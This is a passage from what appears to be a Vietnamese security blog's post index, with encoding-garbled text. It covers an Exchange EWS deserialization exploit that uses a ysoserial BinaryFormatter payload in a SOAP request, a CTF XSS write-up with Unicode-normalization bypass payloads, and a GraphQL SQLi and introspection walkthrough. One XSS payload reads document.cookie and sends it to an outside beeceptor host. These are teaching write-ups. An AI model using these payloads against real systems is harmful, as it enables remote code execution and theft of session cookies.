load l·∫°i trang add-ins s·∫Ω kh√¥ng reset config. Nice.ExploitSau khi ƒë√£ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch l√† v√†o ƒë∆∞·ª£c ƒë·∫øn ch·ªó deserialize, c·∫ßn t√¨m c√°ch r√°p m·ªôt entry v·ªõi type base64 v√†o ExtensionMasterTable + ysoserial ƒë·ªÉ exploit. Tr·ªü l·∫°i v·ªõi 3 file schema m√¥ t·∫£ c·∫•u tr√∫c xml ·ªü ph·∫ßn ƒë·∫ßu m√¨nh c√≥ nh·∫Øc ƒë·∫øn, type.xsd bi·ªÉu di·ªÖn c√°c type b√™n trong c√°c request soap. M√¨nh ƒëang c·∫ßn check type c·ªßa UserConfiguration, search lu√¥n b·∫±ng browserB√™n trong c√°c node m·∫π s·∫Ω c√≥ th√¥ng tin c√°c node con c√≥ th·ªÉ c√≥ c√πng c·∫•p, quan s√°t th·∫•y r·∫±ng c√πng c·∫•p v·ªõi UserConfigurationName c√≥ hai node c√≥ type base64 l√† XmlData v√† BinaryData. S·ª≠ d·ª•ng m·ªôt trong hai ƒë·ªÉ ƒë∆∞a payload ysoserial v√†o b√™n trong. C√¢u l·ªánh t·∫°o payload.\\ysoserial.exe -c &quot;calc&quot; -g TypeConfuseDelegate -f BinaryFormatter -o base64C·∫•u tr√∫c cu·ªëi c√πng c·ªßa soap request update ExtensionMasterTable&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:m=&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot; xmlns:t=&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&amp;gt; &amp;lt;soap:Header&amp;gt; &amp;lt;t:RequestServerVersion Version=&quot;Exchange2010&quot; /&amp;gt; &amp;lt;/soap:Header&amp;gt; &amp;lt;soap:Body&amp;gt; &amp;lt;m:UpdateUserConfiguration&amp;gt; &amp;lt;m:UserConfiguration&amp;gt; &amp;lt;t:UserConfigurationName Name=&quot;ExtensionMasterTable&quot;&amp;gt; &amp;lt;t:DistinguishedFolderId Id=&quot;inbox&quot;/&amp;gt; &amp;lt;/t:UserConfigurationName&amp;gt;&amp;lt;t:BinaryData&amp;gt;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAcvYyBjYWxjBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=&amp;lt;/t:BinaryData&amp;gt; &amp;lt;t:Dictionary&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgDO&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Boolean&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;false&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgExtV&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Integer32&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;0&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgChkTm&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Integer64&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;637729403684086495&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;/t:Dictionary&amp;gt; &amp;lt;/m:UserConfiguration&amp;gt; &amp;lt;/m:UpdateUserConfiguration&amp;gt; &amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;Refresh l·∫°i trang add-ins, k·∫øt qu·∫£ l√† process calc ƒë∆∞·ª£c t·∫°oREFERENCEShttps://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchangehttps://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange" }, { "title": "Chainreaction - DownUnderCTF 2021", "url": "/posts/Chainreaction-DownUnderCTF-2021/", "categories": "Writeups, DownUnderCTF 2021", "tags": "xss, web, unicode normalised", "date": "2021-09-25 15:55:00 +0700", "snippet": "ƒê√¢y l√† th·ªùi gian m√¨nh b·∫Øt ƒë·∫ßu tham gia c√°c ch∆∞∆°ng tr√¨nh t√¨m ki·∫øm bug bounty. Tuy nhi√™n k·∫øt qu·∫£ mang l·∫°i ch∆∞a ƒë∆∞·ª£c kh·∫£ quan üò≠. ƒê·ªÉ x·ªëc l·∫°i tinh th·∫ßn m√¨nh quy·∫øt ƒë·ªãnh l·∫°i ch∆°i CTF. Hi v·ªçng bounty ƒë·∫ßu ti√™n c·ªßa m√¨nh s·∫Ω xu·∫•t hi·ªán trong t∆∞∆°ng lai g·∫ßn.ReconTrang ch·ªßTrang ch·ªß c·ªßa Chainreaction kh√¥ng c√≥ g√¨ ƒë√°ng b·∫≠n t√¢m, ngo·∫°i tr·ª´ vi·ªác ·∫£nh kh√¥ng load ƒë∆∞·ª£c, nh∆∞ng hi·ªán t·∫°i v·∫´n kh√¥ng bi·∫øt l√≠ do th√¥i b·ªè qua. C√≥ hai button ƒëƒÉng k√Ω ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y c√°c form n√†y kh√¥ng khai th√°c ƒë∆∞·ª£c SQLi. Quan s√°t m·ªôt ch√∫t form ƒëƒÉng k√ΩTrang ƒëƒÉng k√ΩUsername kh√¥ng ƒë∆∞·ª£c ch·ª©a c√°c k√Ω t·ª± &amp;lt; v√† &amp;gt;. V·∫≠y kh·∫£ nƒÉng cao c√≥ th·ªÉ bypass ƒë·ªÉ khai th√°c l·ªói XSS qua username. C≈©ng c√≥ m·ªôt ƒëi·ªÅu ƒë·∫∑c bi·ªát b√™n d∆∞·ªõi form ƒëƒÉng nh·∫≠p l√†m m√¨nh ch√∫ √ΩTrang ƒëƒÉng nh·∫≠pv·∫≠y l√† c√≥ trang ƒëƒÉng nh·∫≠p ri√™ng cho deverloper, v√†o lu√¥n xem c√≥ g√¨ hay hoTrang ƒëƒÉng nh·∫≠p cho developerHi·ªÉu s∆∞∆°ng s∆∞∆°ng nghƒ©a l√† n·∫øu b·∫°n c√≥ t√†i kho·∫£n th√¨ c√≥ th·ªÉ v√†o ƒë∆∞·ªùng d·∫´n /devchat, ƒë·∫∑c bi·ªát h∆°n n·∫øu c√≥ t√†i kho·∫£n admin th√¨ c√≥ th·ªÉ v√†o /admin. Hi·ªán t·∫°i ƒë∆∞∆°ng nhi√™n m√¨nh kh√¥ng th·ªÉ v√†o trang admin ƒë∆∞·ª£c r·ªìi, ng√≥ devchat xem c√≥ g√¨/devchatV·∫≠y l√† c√≥ h·∫≥n m·ªôt trang public lu√¥n ƒëo·∫°n chat n·ªôi b·ªô, ƒë√∫ng v·ªõi m√¥ t·∫£ c·ªßa challenge ü§£ü§£ü§£ H·ªá th·ªëng ƒë∆∞·ª£c x√¢y d·ª±ng b·ªüi c√°c sinh vi√™n c·ªßa tr∆∞·ªùng ƒë·∫°i h·ªçc.ƒêo·∫°n chat c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn NFKD =&amp;gt; NFKD normalised exploit. Ti·∫øp theo t·∫°o m·ªôt t√†i kho·∫£n v√† ƒëƒÉng nh·∫≠p, th√¨ c√≥ th√™m trang profile cho ph√©p thay ƒë·ªïi th√¥ng tin c√° nh√¢n Trang th√¥ng tin t√†i kho·∫£nTa th·∫•y r·∫±ng username ƒë∆∞·ª£c hi·ªÉn th·ªã l√™n giao di·ªán th√¥ng qua l·ªùi ch√†o welcome, th·ª≠ XSS ·ªü ƒë√¢y xem th·∫ø n√†o.Nh∆∞ v·∫≠y h·ªá th·ªëng s·ª≠ d·ª•ng blacklist ƒë·ªÉ ki·ªÉm tra th√¥ng tin username. Nh∆∞ ƒë√£ ƒë·ªÅ c·∫≠p ·ªü tr√™n, ƒëo·∫°n chat c√≥ nh·∫Øc ƒë·∫øn c√°i g·ªçi l√† NFKD, v·∫≠y ch√≠nh x√°c NFKD l√† g√¨ v√† khai th√°c th·∫ø n√†o m√¨nh s·∫Ω tr√¨nh b√†y ng·∫Øn g·ªçn d∆∞·ªõi ƒë√¢y.Unicode Normalization vulnerabilityNormalization (chu·∫©n h√≥a) l√† qu√° tr√¨nh thay ƒë·ªïi ƒë·ªô d√†i bi·ªÉu di·ªÖn nh·ªã ph√¢n ƒë·ªëi v·ªõi m·ªôt k√Ω t·ª± c·ª• th·ªÉ. C√≥ hai ki·ªÉu t∆∞∆°ng ƒë∆∞∆°ng gi·ªØa c√°c k√Ω t·ª± l√† Canonical Equivalence v√† Compatibility Equivalence (m√¨nh kh√¥ng bi·∫øt n√™n ƒë∆∞a v·ªÅ ti·∫øng vi·ªát th·∫ø n√†o) C√°c k√Ω t·ª± t∆∞∆°ng ƒë∆∞∆°ng theo ki·ªÉu Canonical Equivalence s·∫Ω c√≥ c√πng bi·ªÉu di·ªÖn khi in ho·∫∑c hi·ªÉn th·ªã. Trong khi ƒë√≥ Compatibility Equivalence l√† ki·ªÉu t∆∞∆°ng ƒë∆∞∆°ng m·ªÅm d·∫ªo h∆°n khi bi·ªÉu di·ªÖn c·ªßa hai k√Ω t·ª± t∆∞∆°ng ƒë∆∞∆°ng theo ki·ªÉu n√†y c√≥ th·ªÉ kh√°c nhau.C√≥ 4 thu·∫≠t to√°n chu·∫©n h√≥a ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a theo chu·∫©n Unicode: NFC, NFD, NFKD v√† NFKD, m·ªói lo·∫°i √°p d·ª•ng k·ªπ thu·∫≠t chu·∫©n h√≥a Canonical v√† Compatibility theo c√°ch kh√°c nhau. B·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m v·ªÅ c√°c k·ªπ thu·∫≠t kh√°c nhau t·∫°i Unicode.org.Chu·∫©n h√≥a Compatibility m·ªÅm d·∫ªo h∆°n do ƒë√≥ c√≥ th·ªÉ b·ªã hacker khai th√°c ƒë·ªÉ v∆∞·ª£c qua blacklist. V√≠ d·ª• k√Ω t·ª± ‚Äò‚ëß‚Äô sau khi ƒë∆∞·ª£c chu·∫©n h√≥a theo k·ªπ thu·∫≠t Compatibility s·∫Ω th√†nh k√Ω t·ª± ‚Äò8‚Äô, nh∆∞ v·∫≠y hacker c√≥ th·ªÉ d√πng k√Ω t·ª± n√†y ƒë·ªÉ v∆∞·ª£t qua blacklist ch·ª©a ‚Äò8‚Äô.ƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ Unicode Normalization c≈©ng nh∆∞ c√°ch khai th√°c, b·∫°n c√≥ th·ªÉ tham kh·∫£o t√†i li·ªáu sau.Solve challengeNh∆∞ v·∫≠y ƒë√£ hi·ªÉu s∆° qua v·ªÅ c√°c khai th√°c unicode normalization. B·∫Øt tay v√†o exploit th√¥i, c√°c k√Ω t·ª± ƒë·∫°i di·ªán m√¨nh s·∫Ω c·∫ßn ƒë·ªÉ bypass blacklist s·∫Ω l√† Ôºú(%ef%bc%9c) thay cho k√Ω t·ª± &amp;lt; Ôºû(%ef%bc%9e) thay cho k√Ω t·ª± &amp;gt; ‚Å± (%e2%81%b1) thay cho k√Ω t·ª± iC√°c k√Ω t·ª± t∆∞∆°ng ƒë∆∞∆°ng b·∫°n c√≥ th·ªÉ t√¨m ·ªü t√†i li·ªáu sau.Test th·ª≠ script c∆° b·∫£n, s·ª≠ d·ª•ng beeceptor nh∆∞ m·ªôt mockup server ƒë·ªÉ validate. Tr∆∞·ªùng m√¨nh s·ª≠ d·ª•ng ƒë·ªÉ XSS s·∫Ω l√† username trong trang profile&amp;lt;script&amp;gt; var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;,&quot;https://hoangnd.free.beeceptor.com&quot;); xhr.send();&amp;lt;/script&amp;gt;ƒê·ªÉ bypass blacklist, m√¨nh s·∫Ω thay th·∫ø c√°c k√Ω t·ª± &amp;lt; &amp;gt; i b·∫±ng c√°c k√Ω t·ª± t∆∞∆°ng ƒë∆∞∆°ng ·ªü tr√™n (k√Ω t·ª± i ƒë·ªÉ bypass chu·ªói ‚Äòscript‚Äô). Nh∆∞ v·∫≠y payload c·ªßa m√¨nh s·∫Ω l√†%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;,&quot;https://hoangnd.free.beeceptor.com&quot;); xhr.send();%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9eK·∫øt qu·∫£ g·ª≠i requestV·∫≠y l√† ƒë√£ t·∫°o ƒë∆∞·ª£c m·ªôt node script ƒë·ªÉ ch√®n javascript, b√™n beeceptor c≈©ng ƒë√£ nh·∫≠n ƒë∆∞·ª£c requestOke, ƒë·∫øn ƒë√¢y ƒë·ªÉ m·∫°o danh admin, c·∫ßn ph·∫£i c√≥ ƒë∆∞·ª£c cookie ƒëƒÉng nh·∫≠p c·ªßa admin. How? ƒê·∫ßu ti√™n c·∫ßn quay l·∫°i m·ªôt ch√∫t trang ch√°t ch√≠t c·ªßa h·ªôi dev. Ch√≠nh √¥ng admin ƒë√£ ti·∫øt l·ªô nh∆∞ sauDo t√≠nh nƒÉng c·ªßa trang admin ch∆∞a ƒë∆∞·ª£c ho√†n th√†nh, admin s·∫Ω s·ª≠ d·ª•ng 1 cookie tƒ©nh ƒë·ªÉ x√°c th·ª±c, browser c·ªßa admin ch·∫Øc ch·∫Øn c√≤n l∆∞u cookie n√†y. Th·∫ø l√†m th·∫ø n√†o ƒë·ªÉ admin m·ªü profile t√†i kho·∫£n c·ªßa m√¨nh ƒë·ªÉ k√≠ch ho·∫°t XSS g·ª≠i cookie v·ªÅ cho beeceptor? C√¢u tr·∫£ l·ªùi n·∫±m ·ªü t√≠nh nƒÉng report ·ªü trang profileNghƒ©a l√† m√¨nh c·ª© ·∫•n report l√† √¥ng admin s·∫Ω v√†o trang profile ƒë·ªÉ check l·ªói =&amp;gt; XSS. Test nhanh k·∫ªo ngu·ªôi b·∫±ng payload sau%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e var c = document.cookie; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;,&quot;https://hoangnd.free.beeceptor.com/exploit&quot;); xhr.send(c);%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9eK·∫øt qu·∫£ g·ª≠i requestTi·∫øp theo l√† ·∫•n report v√† quan s√°t b√™n beeceptorV·∫≠y l√† ƒë√£ l·∫•y ƒë∆∞·ª£c cookie c·ªßa admin, v√†o /admin l·∫•y c·ªù th√¥i" }, { "title": "All Baked Up - H@cktivityCon 2021 CTF", "url": "/posts/all-baked-up-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "graphql, web, sqli", "date": "2021-09-19 22:00:00 +0700", "snippet": "GraphQLV√¨ challenge n√†y li√™n quan ƒë·∫øn graphql v√† m√¨nh ch∆∞a bi·∫øt v·ªÅ c√°i n√†y n√™n s·∫Ω m√¥ t·∫£ qua ·ªü ƒë√¢y m·ªôt ch√∫t. GraphQL l√† ng√¥n ng·ªØ truy v·∫•n cho c√°c API v√† runtime ƒë·ªÉ th·ª±c hi·ªán c√°c truy v·∫•n ƒë√≥ v·ªõi d·ªØ li·ªáu. Nghƒ©a l√† ng∆∞·ªùi d√πng s·∫Ω t∆∞∆°ng t√°c v·ªõi API th√¥ng qua graphqlM·ª•c ƒë√≠ch c·ªßa graphql l√† t·∫°o ra m·ªôt endpoint ƒë∆°n gi·∫£n d·ªÖ hi·ªÉu d·ªÖ s·ª≠ d·ª•ng ƒë·ªÉ handle t·∫•t c·∫£ c√°c endpoint ph·ª©c t·∫°p c√≤n l·∫°i. V·ªÅ operation trong graphql c√≥ hai ki·ªÉu ch√≠nh l√† query v√† mutation. ·ªû ƒë√¢y query t∆∞∆°ng ƒë∆∞∆°ng v·ªõi c√¢u l·ªánh select b√¨nh th∆∞·ªùng, trong khi ƒë√≥ mutation th∆∞·ªùng th·ª±c hi·ªán c√°c thao t√°c thay ƒë·ªïi b√™n trong d·ªØ li·ªáu (create, update, delete). ƒê·ªÉ d·ªÖ h√¨nh dung th√¨ √Ω t∆∞·ªüng c·ªßa query v√† mutation t∆∞∆°ng ƒë∆∞∆°ng v·ªõi get, post v·ªÅ m·∫∑t convention.Solve challengeAll Baked Up l√† m·ªôt trang web ƒë∆∞·ª£c d√πng ƒë·ªÉ l∆∞u gi·ªØ c√°c c√¥ng th·ª©c l√†m b√°nh. Ch·ª©c nƒÉng ch·ªâ d·ª´ng l·∫°i ·ªü trang li·ªát k√™ danh s√°ch v√† truy c·∫≠p c·ª• th·ªÉ v√†o c√¥ng th·ª©c c·ªßa t·ª´ng lo·∫°i b√°nh.Ph√¢n t√≠ch c√°c request c·ªßa n√≥V·∫≠y l√† trang web s·ª≠ d·ª•ng c√¥ng ngh·ªá graphql ƒë·ªÉ th·ª±c hi·ªán truy v·∫•n. Ph√¢n t√≠ch qua m·ªôt ch√∫t v·ªÅ payload trong request c·ªßa b√†i n√†yTruy v·∫•n ƒë∆∞·ª£c th·ª±c hi·ªán c√≥ t√™n l√† UserQuery, ki·ªÉu truy v·∫•n l√† Query. B√™n trong truy v·∫•n th·ª±c hi·ªán l·∫•y post th√¥ng qua vi·ªác ki·ªÉm tra thu·ªôc t√≠nh name. B√¢y gi·ªù th·ª≠ detect sqli xem th·∫ø n√†o, ·ªü ƒë√¢y m√¨nh th·ª≠ detect trong tr∆∞·ªùng name b·∫±ng d·∫•u ‚ÄòK·∫øt qu·∫£ tr·∫£ v·ªÅ l·ªói sql, nh∆∞ v·∫≠y c√≥ th·ªÉ th·ª±c hi·ªán sqli ·ªü tr∆∞·ªùng n√†y, ti·∫øp t·ª•c sqli v·ªõi union m√¨nh thu ƒë∆∞·ª£cV·∫≠y c√≥ th·ªÉ retrieve d·ªØ li·ªáu th√¥ng qua c√°c v·ªã tr√≠ 2,3,4,6. Ti·∫øp theo l√† b∆∞·ªõc SQLi ƒë∆°n gi·∫£n m√¨nh xin ph√©p l∆∞·ªõt qua. K·∫øt qu·∫£ m√¨nh ƒë·∫°t ƒë∆∞·ª£c l√† trang web s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu SQLite, c√≥ hai table l√† users v√† posts. B√™n trong posts kh√¥ng c√≥ g√¨ hay ho v√¨ ƒë√£ hi·ªÉn th·ªã h√™n l√™n giao di·ªán ng∆∞·ªùi d√πng r·ªìi. Ki·ªÉm tra users th√¨ th·∫•y c√≥ m·ªôt user duy nh·∫•t l√† t√™n c·ªßa t√°c gi·∫£ b√†i n√†y.Nh∆∞ v·∫≠y m√¨nh ƒë√£ c√≥ ƒë∆∞·ª£c th√¥ng tin ƒëƒÉng nh·∫≠p c·ªßa m·ªôt user, tuy nhi√™n trang ƒëƒÉng nh·∫≠p ·ªü ƒë√¢u ??????. Sau ƒë√≥ m√¨nh s·ª≠ d·ª•ng c√¥ng c·ª• Gobuster ƒë·ªÉ ki·ªÉm tra c√°c endpoint, tuy nhi√™n kh√¥ng c√≥ b·∫•t k·ª≥ endpoint n√†o cho vi·ªác ƒëƒÉng nh·∫≠p. ƒê·ªÉ √Ω k·ªπ th√¨ trong request c·ªßa m√¨nh c√≥ tr∆∞·ªùng session, decode ra th·∫•y th√¥ng tin ƒëƒÉng nh·∫≠p l√† guest, h·∫≥n l√† ph·∫£i c√≥ m·ªôt c√°ch th·ª©c ƒëƒÉng nh·∫≠p n√†o ƒë√≥.Sau ƒë√≥ m√¨nh t√¨m ki·∫øm c√°c l·ªói graphql tr√™n m·∫°ng, v√† t√¨m th·∫•y c√≥ th·ª© g·ªçi l√† __schema. ƒê√¢y l√† m·ªôt system type ch·ª©a c√°c th√¥ng tin v·ªÅ query c≈©ng nh∆∞ mutation (t∆∞∆°ng t·ª± information_schema c·ªßa Mysql). ƒÇn s·∫µn b√™ lu√¥n payload tr√™n m·∫°ng v√†o üôè.&quot;query&quot;:&quot;query UserQuery {\\n__schema{\\nqueryType{\\nname\\n}mutationType{\\nname\\n}subscriptionType{\\nname\\n}types{\\n...FullType\\n}directives{\\nname description locations args{\\n...InputValue\\n}\\n}\\n}\\n}fragment FullType on __Type{\\nkind name description fields(includeDeprecated:true){\\nname description args{\\n...InputValue\\n}type{\\n...TypeRef\\n}isDeprecated deprecationReason\\n}inputFields{\\n...InputValue\\n}interfaces{\\n...TypeRef\\n}enumValues(includeDeprecated:true){\\nname description isDeprecated deprecationReason\\n}possibleTypes{\\n...TypeRef\\n}\\n}fragment InputValue on __InputValue{\\nname description type{\\n...TypeRef\\n}defaultValue\\n}fragment TypeRef on __Type{\\nkind name ofType{\\nkind name ofType{\\nkind name ofType{kind name ofType{\\nkind name ofType{\\nkind name ofType{\\nkind name ofType{\\nkind name\\n}\\n}\\n}\\n}\\n}\\n}\\n}\\n}\\n&quot;K·∫øt c·ªßa tr·∫£ v·ªÅ ch·ª©a c√°c query v√† mutation ƒë∆∞·ª£c h·ªó tr·ª£, ·ªü ƒë√¢y m√¨nh t√¨m th·∫•y m·ªôt query ƒë·ªÉ l·∫•y flag{ &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;flag&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null }}Th·ª≠ lu√¥n xem l·∫•y ƒë∆∞·ª£c flag kh√¥ngV·∫≠y l√† b·∫Øt bu·ªôc ph·∫£i ƒëƒÉng nh·∫≠p v√† l·∫•y ƒë∆∞·ª£c token. Ti·∫øp t·ª•c t√¨m ki·∫øm b√™n trong __schema, m√¨nh t√¨m th·∫•y m·ªôt mutation x√°c th·ª±c user{ &quot;args&quot;: [{ &quot;defaultValue&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;name&quot;: &quot;username&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } } }, { &quot;defaultValue&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;name&quot;: &quot;password&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } } } ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;authenticateUser&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;Auth&quot;, &quot;ofType&quot;: null }}T·ª´ thu·ªôc t√≠nh type m√¨nh bi·∫øt 